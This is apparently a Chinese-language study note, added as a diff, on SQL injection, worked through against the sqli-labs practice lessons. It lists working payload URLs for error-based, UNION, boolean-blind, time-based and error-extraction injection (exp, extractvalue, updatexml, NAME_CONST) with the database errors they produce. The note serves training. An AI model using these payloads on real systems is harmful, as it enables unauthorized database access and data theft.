@@ -1,0 +1,68 @@
+基于从服务器接收到的响应
+	▲基于错误的 SQL 注入 
+	
+		http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1'
+			MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+				$sql = "select * from users where id = '$id' limit 0,1"
+			http://xiaoxiaoran.com/sqli/Less-1/index.php?id=1' or 1=1 --+ 
+			
+		http://xiaoxiaoran.com/sqli/Less-2/index.php?id=-1'
+			MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1
+				$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+			http://xiaoxiaoran.com/sqli/Less-2/index.php?id=1 or 1=1 -- +
+			
+		http://xiaoxiaoran.com/sqli/Less-3/index.php?id=1'
+			MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
+				$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
+			http://xiaoxiaoran.com/sqli/Less-3/index.php?id=1') or '1'=('1
+			http://xiaoxiaoran.com/sqli/Less-3/index.php?id=1') or 1=1 -- +
+		
+		http://xiaoxiaoran.com/sqli/Less-4/index.php?id=1"
+			MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1
+				$sql="SELECT * FROM users WHERE id=(“$id”) LIMIT 0,1";
+			http://xiaoxiaoran.com/sqli/Less-4/index.php?id=1") or "1" =("1
+			http://xiaoxiaoran.com/sqli/Less-4/index.php?id=1") or  1=1 -- +
+		
+		http://xiaoxiaoran.com/sqli/Less-1/index.php?id=-1' UNION SELECT 1, 
+		GROUP_CONCAT(schema_name),4 FROM information_schema.schemata -- +LIMIT 0,1
+			SELECT * FROM users WHERE id='-1' UNION SELECT 1, 
+			GROUP_CONCAT(schema_name),3 FROM information_schema.schemata -- +LIMIT 0,1		
+		 =%20 , '=%27  ,#=%23 ,
+	▲联合查询的类型
+	▲堆查询注射
+	
+	▲SQL 盲注
+		基于布尔 SQL 盲注 
+			http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1'and left(version(),1)=5 -- +
+			http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1'and length(database())=8 -- +
+			http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1'and left(database(),1)>'a' -- +
+			http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1'and left(database(),1)='s' -- +
+			http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1'and left(database(),2)='se' -- +
+			http://xiaoxiaoran.com/sqli/Less-6/index.php?id=1" and left(version(),1)=5 -- +
+		基于时间的 SQL 盲注 
+			http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5)) -- +
+			
+		基于报错的 SQL 盲注 
+			http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1' union select (exp(~(select * FROM(SELECT USER())a))),2, 3 -- +
+				DOUBLE value is out of range in 'exp(~((select `a`.`USER()` from (select user() AS `USER()`) `a`)))'
+			http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1' union select (!(select * from (select user())x) - ~0),2,3 -- +
+				BIGINT UNSIGNED value is out of range in '((not((select `x`.`user()` from (select user() AS `user()`) `x`))) - ~(0))'
+			http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) -- +
+				XPATH syntax error: '~5.5.53~'
+			http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) -- +
+				XPATH syntax error: '~5.5.53~'
+			http://xiaoxiaoran.com/sqli/Less-5/index.php?id=1'union select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x -- +
+				Duplicate column name '5.5.53'
+			
+	基于如何处理输入的 SQL 查询（数据类型） 
+		基于字符串 
+		数字或整数为基础的 
+	基于程度和顺序的注入(哪里发生了影响) 
+		★一阶注射 	
+		★二阶注射 
+	基于注入点的位置上的 
+		▲通过用户输入的表单域的注射。 
+		▲通过 cookie 注射。 
+		▲通过服务器变量注射。 （基于头部信息的注射）
+		
+	
